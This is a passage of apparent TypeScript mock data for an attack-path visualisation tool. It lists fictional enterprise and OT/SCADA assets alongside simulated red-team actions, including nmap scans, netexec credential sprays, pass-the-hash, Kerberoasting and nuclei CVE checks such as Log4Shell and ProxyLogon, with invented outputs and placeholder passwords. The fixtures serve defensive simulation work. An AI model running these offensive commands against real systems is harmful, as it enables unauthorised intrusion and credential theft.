      node_executed_at:'2026-06-08T08:10:00Z', node_agent:'palo_alto', node_ip:'10.10.2.50',
      node_expectations:[{expectation_id:'n1f-e05',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`WMI    10.10.2.50  445  FINANCE-ADMIN-01  [*] Windows Server 2019 x64
[-] WMI execution blocked — Windows Firewall rule denies WMI from untrusted source
[!] PREVENTION: AppLocker policy blocked unauthorized WMI consumer
[-] Access denied — Privileged Access Workstation (PAW) protection active` },
  ],
  attack_path_edges: [
    { edge_id:'n1f-al-01', edge_type:'asset_link', edge_source:'n1f-act01', edge_target:'n1f-ep01' },
    { edge_id:'n1f-al-02', edge_type:'asset_link', edge_source:'n1f-act02', edge_target:'n1f-ep01' },
    { edge_id:'n1f-al-03', edge_type:'asset_link', edge_source:'n1f-act03', edge_target:'n1f-ep02' },
    { edge_id:'n1f-al-04', edge_type:'asset_link', edge_source:'n1f-act04', edge_target:'n1f-ep04' },
    { edge_id:'n1f-al-05', edge_type:'asset_link', edge_source:'n1f-act05', edge_target:'n1f-ep07' },
    { edge_id:'n1f-pivot-02-03', edge_type:'pivot', edge_source:'n1f-ep02', edge_target:'n1f-ep03', edge_label:'DB pivot (BLOCKED by EDR)' },
    { edge_id:'n1f-pivot-04-06', edge_type:'pivot', edge_source:'n1f-ep04', edge_target:'n1f-ep06', edge_label:'Golden Ticket (BLOCKED by Credential Guard)' },
  ],
  attack_path_stats: {
    stats_prevented:2, stats_detected:1, stats_undetected:2,
    stats_pending:15, stats_total_actions:5, stats_executed_actions:5,
    stats_captured_endpoints:2, stats_captured_files:2, stats_captured_credentials:2,
 stats_captured_users: 1,
 stats_captured_cves: 1,
  },
  attack_path_definitions: [
    { path_id:'n1f-p1', path_name:'Finance Portal Breach Chain', path_color:'#f44336',
      node_ids:['n1f-ep01','n1f-ep02','n1f-ep03','n1f-ep04','n1f-ep05','n1f-ep06','n1f-ep07'],
      path_outcome:'failed',
      path_fail_reason:'PREVENTED by Windows Defender Credential Guard and CrowdStrike Falcon EDR on FINANCE-DC-01',
      failed_from_node_id:'n1f-ep04',
      path_segment_reasons:{
        'n1f-ep01->n1f-ep02':'Credential reuse (svc_app)',
        'n1f-ep02->n1f-ep03':'BLOCKED — EDR quarantined lateral movement',
        'n1f-ep04->n1f-ep06':'BLOCKED — Credential Guard prevented Golden Ticket',
      },
    },
  ],
};


// ══════════════════════════════════════════════════════════════════════════════
// NEW SCENARIO C — Enterprise Red Team Campaign (2 paths, 50 eps: 30 used + 20 untouched, no pivots)
// Real-world: Red team targets multi-zone enterprise. Path 1 = Corporate zone (web/app/db/AD).
// Path 2 = OT/SCADA zone. All attacks via nmap/nuclei/netexec injectors — zero lateral movement.
// ══════════════════════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_NEW_2PATH_50EP: AttackPathData = {
  attack_path_nodes: [
    { node_id:'n2-ep01', node_type:'ASSET', node_label:'CORP-WEB-01', node_hostname:'CORP-WEB-01',
      node_ip:'10.20.0.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'DMZ', node_subnet:'10.20.0.0/24', node_is_entry_point:true, node_is_pivot:true, node_user_privileges:'www-data (Apache)', },
    { node_id:'n2-ep02', node_type:'ASSET', node_label:'CORP-APP-01', node_hostname:'CORP-APP-01',
      node_ip:'10.20.1.11', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'App Tier', node_subnet:'10.20.1.0/24', node_user_privileges:'CORP\svc_app', node_credentials_found:['CORP\\svc_db:DbConn2024!'], },
    { node_id:'n2-ep03', node_type:'ASSET', node_label:'CORP-DB-01', node_hostname:'CORP-DB-01',
      node_ip:'10.20.1.12', node_platform:'Windows Server 2022', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'DB Tier', node_subnet:'10.20.1.0/24', node_user_privileges:'sa (SQL Server)', node_credentials_found:['sa:Sql@dm1n2024'], },
    { node_id:'n2-ep04', node_type:'ASSET', node_label:'CORP-DC-01', node_hostname:'CORP-DC-01',
      node_ip:'10.20.2.5', node_platform:'Windows Server 2022', node_status:'detected',
      node_agents:['palo_alto', 'sentinel_one'],
      node_zone:'Core', node_subnet:'10.20.2.0/24', node_is_pivot:true, node_user_privileges:'CORP\Administrator', },
    { node_id:'n2-ep05', node_type:'ASSET', node_label:'CORP-MAIL-01', node_hostname:'CORP-MAIL-01',
      node_ip:'10.20.2.10', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Core', node_subnet:'10.20.2.0/24', node_accessed_files:['C:\\Exchange\\MailboxDB.edb'], },
    { node_id:'n2-ep06', node_type:'ASSET', node_label:'CORP-FILE-01', node_hostname:'CORP-FILE-01',
      node_ip:'10.20.1.20', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'File Srv', node_subnet:'10.20.1.0/24', node_credentials_found:['CORP\\jsmith:Finance2024'], node_accessed_files:['\\\\CORP-FILE-01\\Finance\\Payroll.xlsx'], },
    { node_id:'n2-ep07', node_type:'ASSET', node_label:'CORP-WS-01', node_hostname:'CORP-WS-01',
      node_ip:'10.20.3.10', node_platform:'Windows 11', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Workstations', node_subnet:'10.20.3.0/24', },
    { node_id:'n2-ep08', node_type:'ASSET', node_label:'CORP-WS-02', node_hostname:'CORP-WS-02',
      node_ip:'10.20.3.11', node_platform:'Windows 11', node_status:'detected',
      node_agents:['palo_alto'],
      node_zone:'Workstations', node_subnet:'10.20.3.0/24', },
    { node_id:'n2-ep09', node_type:'ASSET', node_label:'CORP-WS-03', node_hostname:'CORP-WS-03',
      node_ip:'10.20.3.12', node_platform:'Windows 11', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Workstations', node_subnet:'10.20.3.0/24', },
    { node_id:'n2-ep10', node_type:'ASSET', node_label:'CORP-WS-04', node_hostname:'CORP-WS-04',
      node_ip:'10.20.3.13', node_platform:'Windows 11', node_status:'undetected',
      node_agents:['openaev'],
      node_zone:'Workstations', node_subnet:'10.20.3.0/24', },
    { node_id:'n2-ep11', node_type:'ASSET', node_label:'CORP-JUMP-01', node_hostname:'CORP-JUMP-01',
      node_ip:'10.20.4.5', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto', 'sentinel_one', 'openaev'],
      node_zone:'Management', node_subnet:'10.20.4.0/24', node_is_pivot:true, },
    { node_id:'n2-ep12', node_type:'ASSET', node_label:'CORP-MGMT-01', node_hostname:'CORP-MGMT-01',
      node_ip:'10.20.4.10', node_platform:'Windows Server 2022', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Management', node_subnet:'10.20.4.0/24', },
    { node_id:'n2-ep13', node_type:'ASSET', node_label:'CORP-APP-02', node_hostname:'CORP-APP-02',
      node_ip:'10.20.1.15', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'App Tier', node_subnet:'10.20.1.0/24', },
    { node_id:'n2-ep14', node_type:'ASSET', node_label:'CORP-DB-02', node_hostname:'CORP-DB-02',
      node_ip:'10.20.1.16', node_platform:'CentOS 7', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'DB Tier', node_subnet:'10.20.1.0/24', },
    { node_id:'n2-ep15', node_type:'ASSET', node_label:'CORP-WEB-02', node_hostname:'CORP-WEB-02',
      node_ip:'10.20.0.15', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'DMZ', node_subnet:'10.20.0.0/24', },
    { node_id:'n2-ep16', node_type:'ASSET', node_label:'OT-HMI-01', node_hostname:'OT-HMI-01',
      node_ip:'10.30.0.10', node_platform:'Windows 10 IoT', node_status:'undetected',
      node_agents:['palo_alto', 'sentinel_one', 'openaev'],
      node_zone:'OT DMZ', node_subnet:'10.30.0.0/24', node_is_entry_point:true, node_is_pivot:true, node_user_privileges:'SCADA\operator', },
    { node_id:'n2-ep17', node_type:'ASSET', node_label:'OT-PLC-01', node_hostname:'OT-PLC-01',
      node_ip:'10.30.1.5', node_platform:'Linux (Siemens)', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'OT Core', node_subnet:'10.30.1.0/24', },
    { node_id:'n2-ep18', node_type:'ASSET', node_label:'OT-HIST-01', node_hostname:'OT-HIST-01',
      node_ip:'10.30.1.10', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'OT Core', node_subnet:'10.30.1.0/24', node_credentials_found:['SCADA\\admin:Plant@2024'], },
    { node_id:'n2-ep19', node_type:'ASSET', node_label:'OT-ENG-01', node_hostname:'OT-ENG-01',
      node_ip:'10.30.2.5', node_platform:'Windows 10', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'Engineering', node_subnet:'10.30.2.0/24', },
    { node_id:'n2-ep20', node_type:'ASSET', node_label:'OT-WEB-01', node_hostname:'OT-WEB-01',
      node_ip:'10.30.0.20', node_platform:'Ubuntu 22.04 LTS', node_status:'detected',
      node_agents:['palo_alto'],
      node_zone:'OT DMZ', node_subnet:'10.30.0.0/24', },
    { node_id:'n2-ep21', node_type:'ASSET', node_label:'OT-DB-01', node_hostname:'OT-DB-01',
      node_ip:'10.30.1.15', node_platform:'Windows Server 2022', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'OT Core', node_subnet:'10.30.1.0/24', },
    { node_id:'n2-ep22', node_type:'ASSET', node_label:'OT-WS-01', node_hostname:'OT-WS-01',
      node_ip:'10.30.2.10', node_platform:'Windows 11', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'Engineering', node_subnet:'10.30.2.0/24', },
    { node_id:'n2-ep23', node_type:'ASSET', node_label:'OT-WS-02', node_hostname:'OT-WS-02',
      node_ip:'10.30.2.11', node_platform:'Windows 11', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Engineering', node_subnet:'10.30.2.0/24', },
    { node_id:'n2-ep24', node_type:'ASSET', node_label:'OT-WS-03', node_hostname:'OT-WS-03',
      node_ip:'10.30.2.12', node_platform:'Windows 10', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'Engineering', node_subnet:'10.30.2.0/24', },
    { node_id:'n2-ep25', node_type:'ASSET', node_label:'OT-JUMP-01', node_hostname:'OT-JUMP-01',
      node_ip:'10.30.3.5', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto', 'openaev'],
      node_zone:'OT Management', node_subnet:'10.30.3.0/24', node_is_pivot:true, },
    { node_id:'n2-ep26', node_type:'ASSET', node_label:'OT-CTRL-01', node_hostname:'OT-CTRL-01',
      node_ip:'10.30.1.20', node_platform:'Linux (SCADA)', node_status:'prevented',
      node_agents:['palo_alto'],
      node_zone:'OT Core', node_subnet:'10.30.1.0/24', },
    { node_id:'n2-ep27', node_type:'ASSET', node_label:'OT-SENS-01', node_hostname:'OT-SENS-01',
      node_ip:'10.30.1.25', node_platform:'Linux (Embedded)', node_status:'undetected',
      node_agents:['sentinel_one'],
      node_zone:'OT Core', node_subnet:'10.30.1.0/24', },
    { node_id:'n2-ep28', node_type:'ASSET', node_label:'OT-LOG-01', node_hostname:'OT-LOG-01',
      node_ip:'10.30.3.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_agents:['sentinel_one', 'openaev'],
      node_zone:'OT Management', node_subnet:'10.30.3.0/24', },
    { node_id:'n2-ep29', node_type:'ASSET', node_label:'OT-APP-01', node_hostname:'OT-APP-01',
      node_ip:'10.30.0.25', node_platform:'Windows Server 2019', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'OT DMZ', node_subnet:'10.30.0.0/24', },
    { node_id:'n2-ep30', node_type:'ASSET', node_label:'OT-DC-01', node_hostname:'OT-DC-01',
      node_ip:'10.30.3.15', node_platform:'Windows Server 2022', node_status:'undetected',
      node_agents:['palo_alto'],
      node_zone:'OT Management', node_subnet:'10.30.3.0/24', node_credentials_found:['SCADA\\Administrator:$krbtgt$...'], },
    { node_id:'n2-ep31', node_type:'ASSET', node_label:'CORP-SPARE-01', node_hostname:'CORP-SPARE-01', node_ip:'10.99.0.11', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n2-ep32', node_type:'ASSET', node_label:'CORP-SPARE-02', node_hostname:'CORP-SPARE-02', node_ip:'10.99.0.12', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n2-ep33', node_type:'ASSET', node_label:'CORP-SPARE-03', node_hostname:'CORP-SPARE-03', node_ip:'10.99.0.13', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n2-ep34', node_type:'ASSET', node_label:'CORP-SPARE-04', node_hostname:'CORP-SPARE-04', node_ip:'10.99.0.14', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n2-ep35', node_type:'ASSET', node_label:'CORP-SPARE-05', node_hostname:'CORP-SPARE-05', node_ip:'10.99.0.15', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n2-ep36', node_type:'ASSET', node_label:'CORP-SPARE-06', node_hostname:'CORP-SPARE-06', node_ip:'10.99.0.16', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n2-ep37', node_type:'ASSET', node_label:'CORP-SPARE-07', node_hostname:'CORP-SPARE-07', node_ip:'10.99.0.17', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n2-ep38', node_type:'ASSET', node_label:'CORP-SPARE-08', node_hostname:'CORP-SPARE-08', node_ip:'10.99.0.18', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n2-ep39', node_type:'ASSET', node_label:'CORP-SPARE-09', node_hostname:'CORP-SPARE-09', node_ip:'10.99.0.19', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n2-ep40', node_type:'ASSET', node_label:'CORP-SPARE-10', node_hostname:'CORP-SPARE-10', node_ip:'10.99.0.20', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n2-ep41', node_type:'ASSET', node_label:'CORP-SPARE-11', node_hostname:'CORP-SPARE-11', node_ip:'10.99.0.21', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n2-ep42', node_type:'ASSET', node_label:'CORP-SPARE-12', node_hostname:'CORP-SPARE-12', node_ip:'10.99.0.22', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n2-ep43', node_type:'ASSET', node_label:'CORP-SPARE-13', node_hostname:'CORP-SPARE-13', node_ip:'10.99.0.23', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n2-ep44', node_type:'ASSET', node_label:'CORP-SPARE-14', node_hostname:'CORP-SPARE-14', node_ip:'10.99.0.24', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n2-ep45', node_type:'ASSET', node_label:'CORP-SPARE-15', node_hostname:'CORP-SPARE-15', node_ip:'10.99.0.25', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n2-ep46', node_type:'ASSET', node_label:'CORP-SPARE-16', node_hostname:'CORP-SPARE-16', node_ip:'10.99.1.10', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n2-ep47', node_type:'ASSET', node_label:'CORP-SPARE-17', node_hostname:'CORP-SPARE-17', node_ip:'10.99.1.11', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n2-ep48', node_type:'ASSET', node_label:'CORP-SPARE-18', node_hostname:'CORP-SPARE-18', node_ip:'10.99.1.12', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n2-ep49', node_type:'ASSET', node_label:'CORP-SPARE-19', node_hostname:'CORP-SPARE-19', node_ip:'10.99.1.13', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n2-ep50', node_type:'ASSET', node_label:'CORP-SPARE-20', node_hostname:'CORP-SPARE-20', node_ip:'10.99.1.14', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n2-act01', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.20.0.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -sV -p 80,443,8080,8443',
      node_executed_at:'2026-06-05T06:12:00Z', node_agent:'openaev', node_ip:'10.20.0.10',
      node_expectations:[{expectation_id:'n2-e01',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 80/tcp nginx 1.24, 443/tcp ssl, 8080/tcp Apache/Tomcat discovered`,
      node_ports_found:['80/tcp open http nginx 1.24.0', '443/tcp open ssl/https nginx 1.24.0', '8080/tcp open http Apache Tomcat 9.0.65'] },
    { node_id:'n2-act02', node_type:'ACTION', node_label:'netexec – SMB credential spray — 10.20.1.11',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.20.1.11 -u svc_app -p AppSvc2024! --shares',
      node_executed_at:'2026-06-05T06:24:00Z', node_agent:'openaev', node_ip:'10.20.1.11',
      node_expectations:[{expectation_id:'n2-e02',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB [+] CORP\\svc_app:AppSvc2024! (Pwn3d!) svc_db creds in web.config` },
    { node_id:'n2-act03', node_type:'ACTION', node_label:'nuclei – CVE-2022-26134 — 10.20.1.12',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2022-26134',
      node_command:'nuclei', node_arguments:'-u http://10.20.1.12:8090 -t cves/2022/CVE-2022-26134.yaml',
      node_executed_at:'2026-06-05T06:36:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.12',
      node_expectations:[{expectation_id:'n2-e03',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2022-26134] [critical] Confluence OGNL injection RCE → admin creds extracted`,
      node_cves_found:['CVE-2022-26134 (Confluence OGNL Injection RCE) - CRITICAL'] },
    { node_id:'n2-act04', node_type:'ACTION', node_label:'netexec – LDAP Kerberoasting — 10.20.2.5',
      node_status:'detected', node_payload_name:'netexec – LDAP Kerberoasting',
      node_command:'netexec', node_arguments:'ldap 10.20.2.5 -u admin -p Admin2024 --kerberoasting',
      node_executed_at:'2026-06-05T06:48:00Z', node_agent:'sentinel_one', node_ip:'10.20.2.5',
      node_expectations:[{expectation_id:'n2-e04',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`LDAP [+] Kerberoasting: svc_mssql $krbtgs$23$*... DETECTION ALERT raised by SIEM`,
      node_users_found:['CORP\\Administrator', 'CORP\\svc_mssql', 'CORP\\svc_app', 'CORP\\jsmith', 'CORP\\fin.taylor', 'CORP\\svc_backup'] },
    { node_id:'n2-act05', node_type:'ACTION', node_label:'nuclei – CVE-2021-26855 — 10.20.2.10',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-26855',
      node_command:'nuclei', node_arguments:'-u https://10.20.2.10 -t cves/2021/CVE-2021-26855.yaml',
      node_executed_at:'2026-06-05T07:00:00Z', node_agent:'sentinel_one', node_ip:'10.20.2.10',
      node_expectations:[{expectation_id:'n2-e05',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-26855] [critical] Exchange ProxyLogon → SYSTEM shell on CORP-MAIL-01`,
      node_cves_found:['CVE-2021-26855 (Exchange ProxyLogon SSRF) - CRITICAL', 'CVE-2021-27065 (Exchange Arbitrary File Write) - CRITICAL'] },
    { node_id:'n2-act06', node_type:'ACTION', node_label:'netexec – SMB shares — 10.20.1.20',
      node_status:'undetected', node_payload_name:'netexec – SMB shares',
      node_command:'netexec', node_arguments:'smb 10.20.1.20 -u jsmith -p Finance2024 --shares',
      node_executed_at:'2026-06-05T07:12:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.20',
      node_expectations:[{expectation_id:'n2-e06',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB [+] CORP-FILE-01 admin shares: C$, Finance$, HR$. Payroll.xlsx exfiltrated (42 MB)` },
    { node_id:'n2-act07', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.20.3.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 135,445,3389 10.20.3.10',
      node_executed_at:'2026-06-05T07:24:00Z', node_agent:'openaev', node_ip:'10.20.3.10',
      node_expectations:[{expectation_id:'n2-e07',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 135/tcp msrpc, 445/tcp microsoft-ds, 3389/tcp ms-wbt-server`,
      node_ports_found:['135/tcp open msrpc Microsoft Windows RPC', '139/tcp open netbios-ssn', '445/tcp open microsoft-ds', '3389/tcp open ms-wbt-server RDP'] },
    { node_id:'n2-act08', node_type:'ACTION', node_label:'netexec – WinRM exec — 10.20.3.11',
      node_status:'detected', node_payload_name:'netexec – WinRM exec',
      node_command:'netexec', node_arguments:'winrm 10.20.3.11 -u jsmith -p Finance2024 -x whoami',
      node_executed_at:'2026-06-05T07:36:00Z', node_agent:'palo_alto', node_ip:'10.20.3.11',
      node_expectations:[{expectation_id:'n2-e08',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`WinRM [+] CORP\\jsmith:Finance2024 (Pwn3d!) DETECTION: Unusual WinRM login flagged` },
    { node_id:'n2-act09', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.20.3.12',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 22,445,3389 10.20.3.12',
      node_executed_at:'2026-06-05T07:48:00Z', node_agent:'openaev', node_ip:'10.20.3.12',
      node_expectations:[{expectation_id:'n2-e09',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 22/tcp ssh OpenSSH 8.9, 445/tcp smb, 3389/tcp rdp open` },
    { node_id:'n2-act10', node_type:'ACTION', node_label:'nuclei – CVE-2023-23397 — 10.20.3.13',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2023-23397',
      node_command:'nuclei', node_arguments:'-u https://10.20.3.13 -t cves/2023/CVE-2023-23397.yaml',
      node_executed_at:'2026-06-05T08:00:00Z', node_agent:'sentinel_one', node_ip:'10.20.3.13',
      node_expectations:[{expectation_id:'n2-e10',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2023-23397] [critical] Outlook NTLM hash theft → CORP NTLMv2 hash captured` },
    { node_id:'n2-act11', node_type:'ACTION', node_label:'netexec – SMB pass-the-hash — 10.20.4.5',
      node_status:'undetected', node_payload_name:'netexec – SMB pass-the-hash',
      node_command:'netexec', node_arguments:'smb 10.20.4.5 -u Administrator -H $NTHASH',
      node_executed_at:'2026-06-05T08:12:00Z', node_agent:'palo_alto', node_ip:'10.20.4.5',
      node_expectations:[{expectation_id:'n2-e11',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB [+] PTH successful on CORP-JUMP-01 → CORP\\Administrator (Pwn3d!)` },
    { node_id:'n2-act12', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.20.4.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 22,443,8443 10.20.4.10',
      node_executed_at:'2026-06-05T08:24:00Z', node_agent:'openaev', node_ip:'10.20.4.10',
      node_expectations:[{expectation_id:'n2-e12',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 22/tcp ssh, 443/tcp ssl nginx, 8443/tcp https-alt open` },
    { node_id:'n2-act13', node_type:'ACTION', node_label:'nuclei – CVE-2021-44228 — 10.20.1.15',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-44228',
      node_command:'nuclei', node_arguments:'-u http://10.20.1.15:8080 -t cves/2021/CVE-2021-44228.yaml',
      node_executed_at:'2026-06-05T08:36:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.15',
      node_expectations:[{expectation_id:'n2-e13',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-44228] [critical] Log4Shell on CORP-APP-02 → RCE uid=tomcat` },
    { node_id:'n2-act14', node_type:'ACTION', node_label:'netexec – MSSQL enum — 10.20.1.16',
      node_status:'undetected', node_payload_name:'netexec – MSSQL enum',
      node_command:'netexec', node_arguments:'mssql 10.20.1.16 -u sa -p Sql@dm1n2024 -q "SELECT name FROM master..sysdatabases"',
      node_executed_at:'2026-06-05T08:48:00Z', node_agent:'sentinel_one', node_ip:'10.20.1.16',
      node_expectations:[{expectation_id:'n2-e14',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`MSSQL [+] sa:Sql@dm1n2024 → 5 databases enumerated, xp_cmdshell enabled` },
    { node_id:'n2-act15', node_type:'ACTION', node_label:'nuclei – CVE-2022-22965 — 10.20.0.15',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2022-22965',
      node_command:'nuclei', node_arguments:'-u http://10.20.0.15:8080 -t cves/2022/CVE-2022-22965.yaml',
      node_executed_at:'2026-06-05T09:00:00Z', node_agent:'sentinel_one', node_ip:'10.20.0.15',
      node_expectations:[{expectation_id:'n2-e15',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2022-22965] [critical] Spring4Shell on CORP-WEB-02 → web shell deployed` },
    { node_id:'n2-act16', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.30.0.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -sV -p 80,102,502,20000',
      node_executed_at:'2026-06-05T09:12:00Z', node_agent:'openaev', node_ip:'10.30.0.10',
      node_expectations:[{expectation_id:'n2-e16',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 80/tcp http, 102/tcp S7 (Siemens), 502/tcp modbus, 20000/tcp dnp3` },
    { node_id:'n2-act17', node_type:'ACTION', node_label:'nuclei – Siemens S7 Probe — 10.30.1.5',
      node_status:'undetected', node_payload_name:'nuclei – Siemens S7 Probe',
      node_command:'nuclei', node_arguments:'-t ics/siemens-s7-identify.yaml',
      node_executed_at:'2026-06-05T09:24:00Z', node_agent:'sentinel_one', node_ip:'10.30.1.5',
      node_expectations:[{expectation_id:'n2-e17',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Siemens S7-300 identified: CPU FW V3.3.17, module info extracted` },
    { node_id:'n2-act18', node_type:'ACTION', node_label:'netexec – SMB credential spray — 10.30.1.10',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.30.1.10 -u admin -p Plant@2024',
      node_executed_at:'2026-06-05T09:36:00Z', node_agent:'sentinel_one', node_ip:'10.30.1.10',
      node_expectations:[{expectation_id:'n2-e18',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB [+] SCADA\\admin:Plant@2024 (Pwn3d!) Historian DB credentials extracted` },
